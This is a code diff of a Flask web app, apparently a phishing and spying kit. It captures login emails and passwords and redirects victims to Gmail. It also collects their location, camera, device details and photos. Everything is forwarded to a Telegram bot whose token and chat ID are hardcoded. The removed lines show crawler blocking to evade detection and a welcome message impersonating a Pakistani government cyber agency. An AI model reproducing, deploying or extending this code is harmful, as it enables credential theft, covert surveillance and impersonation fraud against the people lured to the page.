@@ -1,58 +1,54 @@
-# main.py
 from flask import Flask, request, render_template, redirect
-import telegram
 import os
-from werkzeug.utils import secure_filename
+import requests
 
 app = Flask(__name__)
 
 BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
 CHAT_ID = '6908281054'
-bot = telegram.Bot(token=BOT_TOKEN)
-UPLOAD_FOLDER = 'uploads'
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-
-@app.before_request
-def block_bots():
-    bot_signatures = ['bot', 'crawl', 'spider', 'google', 'yandex', 'bingpreview']
-    ua = request.headers.get('User-Agent', '').lower()
-    if any(bot in ua for bot in bot_signatures):
-        return "Access Denied (Bot Detected)", 403
 
 @app.route('/')
 def index():
-    return render_template('spy.html')
-
-@app.route('/collect', methods=['POST'])
-def collect():
-    ip = request.remote_addr
-    if request.content_type.startswith('multipart/form-data'):
-        photo = request.files.get('photo')
-        if photo:
-            filename = secure_filename(photo.filename)
-            path = os.path.join(UPLOAD_FOLDER, filename)
-            photo.save(path)
-            bot.send_photo(chat_id=CHAT_ID, photo=open(path, 'rb'))
-    else:
-        data = request.get_json()
-        msg = f"\n🕵️‍♂️ SpyBot Alert\n\n📍 Location: {data.get('latitude')}, {data.get('longitude')}\n📷 Camera: {data.get('camera')}\n🧠 Device: {data.get('deviceInfo')}\n🌐 IP Address: {ip}\n🌐 UserAgent: {data.get('userAgent')}"
-        bot.send_message(chat_id=CHAT_ID, text=msg)
-    return 'OK'
+    return render_template('index.html')
 
 @app.route('/login', methods=['POST'])
 def login():
     email = request.form.get('email')
     password = request.form.get('password')
-    ip = request.remote_addr
-    msg = f"\n📥 New Login Captured:\n📧 Email: {email}\n🔑 Password: {password}\n🌐 IP Address: {ip}"
-    bot.send_message(chat_id=CHAT_ID, text=msg)
-    return redirect('/')
+    message = f"🔐 New Credentials:\n📧 Email: {email}\n🔑 Password: {password}"
+    send_telegram_message(message)
+    return redirect('https://gmail.com')
 
-@app.route('/start', methods=['POST', 'GET'])
-def start():
-    text = "\U0001F44B Welcome to Faizan\u2122 SpyBot!\n\n\u26A0\uFE0F Government of Pakistan – Cyber Intelligence\n\n\U0001F517 Live Monitoring Portal:\nhttps://govt-of-punjab-pak.onrender.com"
-    bot.send_message(chat_id=CHAT_ID, text=text)
-    return 'Welcome message sent'
+@app.route('/collect', methods=['POST'])
+def collect():
+    data = request.get_json()
+    if data:
+        latitude = data.get('latitude')
+        longitude = data.get('longitude')
+        camera = data.get('camera')
+        user_agent = data.get('userAgent')
+        device = data.get('deviceInfo')
+
+        location_info = f"📍 Location: {latitude}, {longitude}" if latitude and longitude else "❌ Location Denied"
+        info = f"🕵️‍♂️ SpyBot Alert\n{location_info}\n📷 Camera: {camera}\n🧠 Device: {device}\n🌐 UserAgent: {user_agent}"
+        send_telegram_message(info)
+    return 'ok'
+
+@app.route('/photo', methods=['POST'])
+def photo():
+    if 'photo' in request.files:
+        photo = request.files['photo']
+        files = {'photo': (photo.filename, photo.stream, photo.mimetype)}
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        data = {'chat_id': CHAT_ID}
+        requests.post(url, data=data, files=files)
+    return 'photo received'
+
+def send_telegram_message(message):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {'chat_id': CHAT_ID, 'text': message}
+    requests.post(url, data=payload)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
